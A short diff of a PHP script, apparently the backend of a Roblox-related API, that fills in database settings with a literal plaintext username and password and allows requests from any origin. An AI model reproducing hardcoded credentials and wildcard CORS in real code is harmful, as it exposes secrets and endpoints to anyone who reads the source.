@@ -1,10 +1,10 @@
 <?php
     header("Access-Control-Allow-Origin: *");
 
-    $servername = "";
-    $username = "";
-    $password = "";
-    $dbname = "rblxapi";
+    $servername = "FuaBeam";
+    $username = "FuaBeam";
+    $password = "Unfuagt14";
+    $dbname = "Roblox";
     $webhook = $_REQUEST['webhook'];
     $prompt = $_REQUEST['prompt'];
     $id = rand(10,3433434);
